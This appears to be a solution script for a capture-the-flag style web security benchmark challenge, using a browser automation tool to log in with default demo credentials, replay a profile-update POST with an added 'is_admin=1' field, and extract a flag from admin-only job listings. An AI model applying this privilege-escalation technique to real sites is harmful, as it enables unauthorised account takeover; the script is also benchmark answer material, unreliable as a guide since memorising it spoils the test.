#!/usr/bin/env bash
# XBEN-005-24 — "Simple IDOR POST" (tags: idor, jwt, default_credentials)
#
# Log in with the demo account, then notice that the profile form posts only
# `name`, while the endpoint behind it also accepts `is_admin`. The server
# validates the token on that POST but never checks it against the profile being
# edited, so a field the form does not offer is a field the server still takes.
# Admin accounts see the private jobs, and one of them holds the flag.
#
# What h5i contributes: the request being attacked is the one the page itself
# made, so the cookie, the token and the form encoding are all already right.
# The whole attack is one added field.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben005-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

# 1. Log in. `demo`/`demo` is the default account the application seeds.
"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null
"$H5I" browser type --selector "#username" "demo" --session "$SESSION" >/dev/null
"$H5I" browser type --selector "#password" "demo" --session "$SESSION" >/dev/null
# The login button submits an ordinary form: no script needed, and the 303 to
# the company's own page is followed and recorded hop by hop.
"$H5I" browser click --role button --name "Login" --session "$SESSION" >/dev/null

# 2. Open the profile editor and submit it once, unchanged, so the session has
#    the real POST stored: right URL, right cookie, right encoding.
"$H5I" browser navigate "$URL/edit_profile/1" --session "$SESSION" >/dev/null
"$H5I" browser click --role button --name "Update Profile" --session "$SESSION" >/dev/null

SEQ="$("$H5I" websec requests --method POST --url-contains edit_profile --session "$SESSION" |
    python3 -c 'import json,sys; print(json.load(sys.stdin)["requests"][0]["seq"])')"

# 3. Send it again with the field the form never offered. `--create` is required
#    because the field is not there to change: without it h5i refuses rather
#    than inventing one, which is what stops a typo from looking like a finding.
"$H5I" websec replay "req_$SEQ" --set 'form.is_admin=1' --create --session "$SESSION" >/dev/null

# 4. Admin now, so the jobs page includes the private ones.
"$H5I" browser navigate "$URL/company/1/jobs" --session "$SESSION" >/dev/null
"$H5I" browser markdown --session "$SESSION" |
    python3 -c 'import re,sys; m=re.search(r"FLAG\{[a-f0-9]{64}\}", sys.stdin.read()); print(m.group(0) if m else "no flag found")'
